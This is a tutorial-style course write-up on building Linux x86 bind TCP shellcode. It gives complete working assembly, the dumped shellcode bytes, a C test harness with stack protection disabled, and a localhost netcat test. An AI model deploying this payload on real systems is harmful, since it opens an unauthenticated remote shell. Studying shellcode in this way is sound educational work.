# Assignment #1: Bind TCP Shell
Create a shell_bind_tcp shellcode that binds to a port and execute a shell on an incoming connection, the port number should be easy to configure.


## Context

Have you ever generated shellcode with tools like Metasploit and MSFvenom? 
If you have, I'm sure you've wondered what that shellcode actually translates to beyond the generic descriptor "linux/x86/shell_bind_tcp".

I'm going to teach you how to not only read shellcode, but create your own as well.


## Prerequisites

- Basic understanding of registers
- Basic understanding of stack and memory
- An interest in the subject


## Approach

There are dozens of approaches you could take to create shellcode, but before we create it, we first need to need to understand how it works. 
To better understand what's happening, we're going to reverse enginner and analyze it.

```markdown
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# msfvenom --arch x86 --platform linux --payload linux/x86/shell_bind_tcp R | ndisasm -u -
No encoder specified, outputting raw payload
Payload size: 78 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  5B                pop ebx
00000010  5E                pop esi
00000011  52                push edx
00000012  680200115C        push dword 0x5c110002
00000017  6A10              push byte +0x10
00000019  51                push ecx
0000001A  50                push eax
0000001B  89E1              mov ecx,esp
0000001D  6A66              push byte +0x66
0000001F  58                pop eax
00000020  CD80              int 0x80
00000022  894104            mov [ecx+0x4],eax
00000025  B304              mov bl,0x4
00000027  B066              mov al,0x66
00000029  CD80              int 0x80
0000002B  43                inc ebx
0000002C  B066              mov al,0x66
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  59                pop ecx
00000032  6A3F              push byte +0x3f
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32
0000003A  682F2F7368        push dword 0x68732f2f
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80
```


## Was that supposed to mean anything?

Now if you're not experienced with assembly I'm sure your very confused right now. That's alright though, we're going to learn what all this means.
Let's start from the top, where the first "int 0x80" instruction is passed. This is known as a syscall instruction, it let's the processor know to interpret the current registers as such.


## Syscalls

Moving up 1 position, we see the instruction "mov al,0x66". 0x66 converted to Hex is 102. Every syscall has an integer assigned to it so it can be identified and processed as it's specific function. If we inspect "/usr/include/i386-linux-gnu/asm/unistd_32.h" we can see syscall (102) points to "socketcall".

```
#define __NR_socketcall         102
#define __NR_syslog             103
#define __NR_setitimer          104
#define __NR_getitimer          105
#define __NR_stat               106
#define __NR_lstat              107
#define __NR_fstat              108
#define __NR_olduname           109
#define __NR_iopl               110
#define __NR_vhangup            111
#define __NR_idle               112
#define __NR_vm86old            113
```


## What is socketcall? 

Well put simply, it's a common kernel entry point for socket system calls. If we read the documentation [here](https://man7.org/linux/man-pages/man2/socketcall.2.html) we can see it takes 2 parameters: socketcall(int call, unsigned long *args). 
This is important to know because when we call this syscall we'll need to invoke it correctly. 

If we read the documentation we can see it takes the socket function as the first parameter, this means that it's deciding how to invoke it.

Let's keep a note of everything we now known about this syscall and move on.


## Syscalls in the shellcode

If you go through the shellcode you'll see 6 syscalls happening. If you were to analyze how each function works along with their parameters, well it would take a long time. So I've saved you the trouble and compiled a list of each syscall being invoked in order of when they appear.

1. socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))
2. socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT,len(16),4444))
3. socketcall(SYS_LISTEN, sockfd)
4. socketcall(SYS_ACCEPT, (sockfd)
5. dup2(acceptFD, (0x2,0x1,0x0))
6. execve(/bin//sh0x00)


Now I encourage you to actually go through the documentation of each so you have a fundamental understanding of what's actually happening.
You can find the documentation for each below:

1. https://man7.org/linux/man-pages/man2/socketcall.2.html
2. https://man7.org/linux/man-pages/man2/bind.2.html
3. https://man7.org/linux/man-pages/man2/listen.2.html
4. https://man7.org/linux/man-pages/man2/accept.2.html
5. https://man7.org/linux/man-pages/man2/execve.2.html


If you're just looking for a quick and dirty explanation I've got you covered too.

1. socketcall(SYS_SOCKET) creates a kernel entry point for socket system calls
2. socketcall(SYS_BIND) assigns an address to a socket referred to by the sockfd file descriptor
3. socketcall(SYS_LISTEN) marks the socket as passive, meaning it will be used to accept incoming connection requests using accept().
4. socketcall(SYS_ACCEPT) extracts the connection request for the listening socket and creates a new connected socket. The newly created socket is not in the listening state.
5. dup2(acceptFD,*) creates a copy of the file descriptor and uses the new specified file descriptor
6. execve(/bin//sh0x00) executes the program referred to by pathname. Which in this case is "/bin//sh"


Now that we know all the syscalls a simple shell-bind-tcp is making, we can replicate it in our own assembly code!


## Creating our own socket()

If we remember the "socketcall(SYS_SOCKET)" is reponsible for the creation of a socket, which is our first step in creating this bind shell.

This can be achieved with the syscall "socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))".

In assembly that looks like this:
Note: I've added comments to show how each instruction interacts with the syscall.
```
 ; [+] Setting up socketcall() for SYS_SOCKET
        ; int socketcall(int call, unsigned long *args)
        ; int socket(int domain, int type, int protocol)
        ; EAX = socketcall()
        ; EBX = SYS_SOCKET[1]
        ; ECX = (int domain, int type, int protocol)
        xor    eax,eax  ;
        mov    al,0x66  ; setting syscall as socketcall() [REF1]
        xor    ebx,ebx  ;
        push   ebx      ; setting ECX param in memory - 0x0 (0 for tcp(7) stream sockets)       :       [socket_struct --> REF3]
        inc    ebx      ; setting EBX 0x1 (socketcall: SYS_SOCKET[1])                           :       [socketCall_struct --> REF4]
        push   ebx      ; setting ECX param in memory - 0x1,0x0 (socket: SOCK_STREAM[1])        :       [socket --> REF2]
        push   0x2      ; setting ECX param in memory - 0x2,0x1,0x0 (socket: AF_INET[2])        :       [socket --> REF2]
        mov    ecx,esp  ; ECX points to args on stack for socket()                              :       [socket_struct --> REF3]
        int    0x80     ; calling socketcalll(SYS_SOCKET, (socket(AF_INET, SOCK_STREAM, 0))
```

## Attaching the bind() property to our socket

Now that we have our socket, let's go ahead and bind it to an address. In this case we're passing a null value because the address is local (127.0.0.1).

This can be achieved with the syscall "socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT,len(16),4444))".

In assembly that looks like this:
```
; [+] Setting up socketcall() for SYS_BIND
        ; int socketcall(int call, unsigned long *args)
        ; int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
        ; EAX = socketcall
        ; EBX = SYS_BIND[2]
        ; ECX = (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        mov    al,0x66  ; setting syscall as socketcall()
        pop    ebx      ; setting EBX to 0x2 (socketcall: SYS_BIND[2])                          :       [socketcall --> REF1]
        pop    edx      ; removing 0x1 from stack
        xor    edx,edx  ;
        push   edx      ; setting ECX param in memory - NULLBREAK
        push   word 0x5c11      ; setting ECX param in memory - 0x5c11,0x00 (PORT)              :       [bind --> REF5]
        push   0x10     ; setting ECX in memory - 0x10 is 16 bytes - 0x10,0x5c11,0x00           :       [bind --> REF5]
        push   ecx      ; setting ECX in memory - *SYS_SOCKET-struct,0x10,0x5c11,0x00           :       [bind --> REF5] 
        push   esi      ; pushing socket fd onto stack  (SYS_SOCKET-sockfd)                     :       [bind --> REF5]
        mov    ecx,esp  ; save pointer of BIND args into ecx                                    :       [bind --> REF5]
        int    0x80     ; calling socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT,len(16),4444))
```


## Listening on our socket
To actually accept connections, we first need to listen on the socket. Let's do just that.

This can be achieved with the syscall "socketcall(SYS_LISTEN, sockfd)":

In assembly that looks like this:
```
; [+] socketcall() to SYS_LISTEN
        ; int socketcall(int call, unsigned long *args)
        ; int listen(int sockfd, int backlog)
        ; EAX = socketcall
        ; EBX = SYS_LISTEN[4]
        ; ECX = ADDRESS-SYS_BIND-SOCKFD
        mov    al,0x66  ; setting EAX to socketcall() syscall
        mov    bl,0x4   ; setting EBX to 0x4 (socketcall: SYS_LISTEN[4])                        :       [socketcall --> REF1]
        push   esi      ; pushing socket fd onto stack for ECX (SYS_SOCKET-sockfd)              :       [listen --> REF6]
        xor    ecx,ecx  ;
        mov    ecx,esp  ; setting ECX to pointer of SYS_SOCKET procedure - (*SYS_SOCKET-SOCKFD) :       [listen --> REF6]
        int    0x80     ; [*] Calling: socketcall(SYS_LISTEN, (*SYS_SOCKET-sockfd)
```


## Accepting incoming connections

Picture this: You invite your friend over to hang out, you've bought food and driks, you've spent a good deal of time planning it. When your friend finally arrives tries he enter but, oh no! The door is locked! This is alright though, because you can just unlock the door and let him in.

Although a broad and not entirely accurate analogy, this is in theory what we need to occur. When we recieve a connection, we want to accept it to get a shell.

This can be achieved with the syscall "socketcall(SYS_ACCEPT)".

In assmebly that looks like this:
```
sys_accept:
        ; [+] socketcall() to SYS_ACCEPT
        ; int socketcall(int call, unsigned long *args)
        ; int accept(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen)
        ; EAX = socketcall
        ; EBX = SYS_ACCEPT[5]
        ; ECX = ADDRESS-SYS_BIND-SOCKFD
        mov    al,0x66  ; setting EAX to socketcall() syscall
        mov bl,0x5      ; setting EBX to 0x2 (socketcall: SYS_ACCEPT[5])                        :       [socketcall --> REF1]
        push esi        ; pushing socket fd onto stack for ECX (SYS_SOCKET-sockfd)
        mov ecx,esp     ; setting ECX to pointer of SYS_SOCKET procedure - (*SYS_SOCKET-SOCKFD) :       [accept --> REF7]
        int 0x80        ; [*] Calling: socketcall(SYS_ACCEPT, (*SYS_SOCKET-sockfd)
```

## Setting stdin, stdout and stderr

So with most in not all *NIX systems, you have: stdin, stdout and stderr. The way systems interperet it is as integers: 0x0, 0x1, 0x2.
These 3 determine the accepted data streams. It's imperative that our shell accepts all 3 streams, so let's go ahead and do just that!

This can be achieved with the syscall "dup2(acceptFD,*)".

In assmebly that looks like this:
```
; [+] dup2(): replacing accept fd with stdin, stdout, stderr fd's: (0x2,0x1,0x0)
        ; int dup2(int oldfd, int newfd);
        ; EAX = dup2
        ; EBX = acceptfd
        ; ECX = (0x2,0x1,0x0)-1) decrementing loop
        xor ebx,ebx     ;
        mov ebx,eax     ; After accept connection, save acceptfd to EBX (SYS_ACCEPT-ACCEPTFD)   
        xor ecx,ecx     ; 
        mov cl,0x2      ; loop counter for dup2. decrementing loop will look like: (0x2,0x1,0x00)
        dup2_loop:
        push   0x3f     ; using push/pop this time for fun. same as using mov eax,0x3f
        pop    eax      ; setting EAX to dup2() syscall                                         :       [dup2 --> REF8]
        int    0x80     ; [*] Calling: dup2(acceptFD, (0x2,0x1,0x0))
        dec    ecx      ; decrementing loop counter for each iteration
        jns    dup2_loop;  loop up to dup2_loop if not sign (If ECX is positive (0,1,2) then loop, else if negative (0,-1 etc) then continue down)
```

## Our shell

We've got all our pieces in place now, all we need is to execute a shell on connection! 

This can be achieved with the syscall "execve(/bin//sh0x00)".

I think a nice simple "/bin/sh" will work perfectly for our needs.

In assmebly that looks like this:

```
ExecveShell:
        ; [+] execve(): executing /bin//sh      
        ; int execve(const char *pathname, char *const argv[], char *const envp[])
        ; EAX = execve
        ; EBX = /bin//sh
        ; ECX = args followed by 0x00
        xor    eax,eax  ;
        mov    al,11    ; setting EAX to execve syscall
        xor    ebx,ebx  ;
        push   ebx      ; execve requires NULLBYTE after arguments (0x00)                       :       [execve --> REF9]
        push   0x68732f2f ; sh//
        push   0x6e69622f ; nib/ - Pushing /bin//sh onto stack in reverse for EBX               :       [execve --> REF9]
        mov    ebx,esp  ; setting EBX to address of /bin//sh
        xor    ecx,ecx
        xor    esi,esi
        int    0x80     ; [*] Calling: execve(/bin//sh0x00)
```

## Putting it all together

If you followed all the steps you should have an assembly file that looks similar to this:

```
global _start

section .text

_start:
;sys_socket:
	; [+] Setting up socketcall() for SYS_SOCKET
	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	; EAX = socketcall()
	; EBX = SYS_SOCKET[1]
	; ECX = (int domain, int type, int protocol)
	xor    eax,eax	;
	mov    al,0x66	; setting syscall as socketcall() [REF1]
	xor    ebx,ebx	;
	push   ebx	; setting ECX param in memory - 0x0 (0 for tcp(7) stream sockets)	:	[socket_struct --> REF3]
	inc    ebx	; setting EBX 0x1 (socketcall: SYS_SOCKET[1]) 				:	[socketCall_struct --> REF4]
	push   ebx	; setting ECX param in memory - 0x1,0x0 (socket: SOCK_STREAM[1]) 	:	[socket --> REF2]
	push   0x2	; setting ECX param in memory - 0x2,0x1,0x0 (socket: AF_INET[2])	:	[socket --> REF2]
	mov    ecx,esp	; ECX points to args on stack for socket() 				:	[socket_struct --> REF3]
	int    0x80	; calling socketcalll(SYS_SOCKET, (socket(AF_INET, SOCK_STREAM, 0))	


save_sockfd:
	xor esi,esi	;
	mov esi,eax 	; save sockfd in ESI for future syscalls


sys_bind:
	; [+] Setting up socketcall() for SYS_BIND
	; int socketcall(int call, unsigned long *args)
	; int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	; EAX = socketcall
	; EBX = SYS_BIND[2]
	; ECX = (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	mov    al,0x66	; setting syscall as socketcall()
	pop    ebx	; setting EBX to 0x2 (socketcall: SYS_BIND[2])				:	[socketcall --> REF1]
	pop    edx	; removing 0x1 from stack
	xor    edx,edx	;
	push   edx	; setting ECX param in memory - NULLBREAK
	push   word 0x5c11	; setting ECX param in memory - 0x5c11,0x00 (PORT)		:	[bind --> REF5]
	push   0x10	; setting ECX in memory - 0x10 is 16 bytes - 0x10,0x5c11,0x00		:	[bind --> REF5]
	push   ecx	; setting ECX in memory - *SYS_SOCKET-struct,0x10,0x5c11,0x00		:	[bind --> REF5]	
	push   esi	; pushing socket fd onto stack  (SYS_SOCKET-sockfd)			: 	[bind --> REF5]
	mov    ecx,esp	; save pointer of BIND args into ecx					:	[bind --> REF5]
	int    0x80	; calling socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT,len(16),4444))


sys_listen:
	; [+] socketcall() to SYS_LISTEN
	; int socketcall(int call, unsigned long *args)
	; int listen(int sockfd, int backlog)
	; EAX = socketcall
	; EBX = SYS_LISTEN[4]
	; ECX = ADDRESS-SYS_BIND-SOCKFD
	mov    al,0x66  ; setting EAX to socketcall() syscall
	mov    bl,0x4	; setting EBX to 0x4 (socketcall: SYS_LISTEN[4])			:	[socketcall --> REF1]
	push   esi	; pushing socket fd onto stack for ECX (SYS_SOCKET-sockfd)		:	[listen --> REF6]
	xor    ecx,ecx	;
	mov    ecx,esp	; setting ECX to pointer of SYS_SOCKET procedure - (*SYS_SOCKET-SOCKFD)	:	[listen --> REF6]
	int    0x80	; [*] Calling: socketcall(SYS_LISTEN, (*SYS_SOCKET-sockfd)


sys_accept:
	; [+] socketcall() to SYS_ACCEPT
	; int socketcall(int call, unsigned long *args)
	; int accept(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen)
	; EAX = socketcall
	; EBX = SYS_ACCEPT[5]
	; ECX = ADDRESS-SYS_BIND-SOCKFD
	mov    al,0x66	; setting EAX to socketcall() syscall
	mov bl,0x5	; setting EBX to 0x2 (socketcall: SYS_ACCEPT[5])			:	[socketcall --> REF1]
	push esi	; pushing socket fd onto stack for ECX (SYS_SOCKET-sockfd)
	mov ecx,esp	; setting ECX to pointer of SYS_SOCKET procedure - (*SYS_SOCKET-SOCKFD)	:	[accept --> REF7]
	int 0x80	; [*] Calling: socketcall(SYS_ACCEPT, (*SYS_SOCKET-sockfd)


dup2_setup:
	; [+] dup2(): replacing accept fd with stdin, stdout, stderr fd's: (0x2,0x1,0x0)
	; int dup2(int oldfd, int newfd);
	; EAX = dup2
	; EBX = acceptfd
	; ECX = (0x2,0x1,0x0)-1) decrementing loop
	xor ebx,ebx	;
	mov ebx,eax	; After accept connection, save acceptfd to EBX (SYS_ACCEPT-ACCEPTFD)	
	xor ecx,ecx	; 
	mov cl,0x2	; loop counter for dup2. decrementing loop will look like: (0x2,0x1,0x00)
dup2_loop:
	push   0x3f	; using push/pop this time for fun. same as using mov eax,0x3f
	pop    eax	; setting EAX to dup2() syscall						:	[dup2 --> REF8]
	int    0x80	; [*] Calling: dup2(acceptFD, (0x2,0x1,0x0))
	dec    ecx	; decrementing loop counter for each iteration
	jns    dup2_loop;  loop up to dup2_loop if not sign (If ECX is positive (0,1,2) then loop, else if negative (0,-1 etc) then continue down)


ExecveShell:
	; [+] execve(): executing /bin//sh	
	; int execve(const char *pathname, char *const argv[], char *const envp[])
	; EAX = execve
	; EBX = /bin//sh
	; ECX = args followed by 0x00
	xor    eax,eax	;
	mov    al,11	; setting EAX to execve syscall
	xor    ebx,ebx	;
	push   ebx	; execve requires NULLBYTE after arguments (0x00)			:	[execve --> REF9]
	push   0x68732f2f ; sh//
	push   0x6e69622f ; nib/ - Pushing /bin//sh onto stack in reverse for EBX		:	[execve --> REF9]
	mov    ebx,esp	; setting EBX to address of /bin//sh
	xor    ecx,ecx
	xor    esi,esi
	int    0x80	; [*] Calling: execve(/bin//sh0x00)
```

If you didn't you do now!

For your own sake, make sure you read over it and fully understand it. It'll help you to understand how it works on a fundamental level.


## Testing our bind shell

So if you're not aware we can't just run assembly from the file, it first needs to be compile and then linked.

During my testing I went ahead and created a file that foes all this along with dumping the shellcode of the compiled file. Please use it to compile your assembly file:
```
# This compiles your assembly code and dumps the shellcode
# copy the shellcode into XOR-encoder.py to generate XOR encoded shell
# read XOR-encoder.py on info regarding that 

# Compile and output
nasm -f elf32 -o $1.o $1.asm; ld -d -o $1 $1.o

# Gets shellcode from output file

## Prints the shellcode in little endian

RAW=$(objdump -d "$1" | grep "^ "|awk -F"[\t]" '{print $2}')
SHELLCODE=""
COUNT=0
for word in $RAW
do
	SHELLCODE=${SHELLCODE}${word:6:2}${word:4:2}${word:2:2}${word:0:2}
	((COUNT++))
done
echo ""
echo "Shellcode: "
echo $SHELLCODE | sed 's/ //g'| sed 's/.\{2\}/\\x&/g'|paste -d '' -s
echo "Shellcode size: ${COUNT} bytes"
```


You then pass the name (NOT INCLUDING EXTENSION) as an argument to the bash file to compile it like so:
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# ./compile-shell-dump.sh bind_shell_tcp

Shellcode: 
\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xf6\x89\xc6\xb0\x66\x5b\x5a\x31\xd2\x52\x66\x68\x11\x5c\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x31\xc9\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x56\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xf6\xcd\x80
Shellcode size: 99 bytes
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# ls
bind_shell_tcp  bind_shell_tcp.asm  bind_shell_tcp.o  compile-shell-dump.sh
```


Now we'll take the dumped shellcode and place it in a C file, we do this to confirm it works in a C program.
```
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xf6\x89\xc6\xb0\x66\x5b\x5a\x31\xd2\x52\x66\x68\x11\x5c\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x31\xc9\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x56\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xf6\xcd\x80";

main(){

	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

Once that's done we're going to need to compile it:
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# gcc -fno-stack-protector -z execstack testingShellcode.c -o testingShellcode
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# ls
testingShellcode  testingShellcode.c
```

And we're done!

## Testing our shell

To test our shell we'll execute our C file, don't be alarmed if it hangs, it should be doing that as it's waiting for a connection:
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# ./testingShellcode
Shellcode Length: 99

```

Now in another terminal we check that the port is running, and it is!:
```
root@ubuntu:/home/ubuntu# netstat -antp | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      4917/testingShellco
```

All that's left to test is the accept and execve syscalls...
```
root@ubuntu:/home/ubuntu# nc 127.0.0.1 4444
```


It works! We've successfully created a shell-bind-tcp from scratch!
```
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# ./testingShellcode
Shellcode Length: 99
# 
```

I hope you enjoyed learning about creating a simple shell-bind-tcp using shellcode!

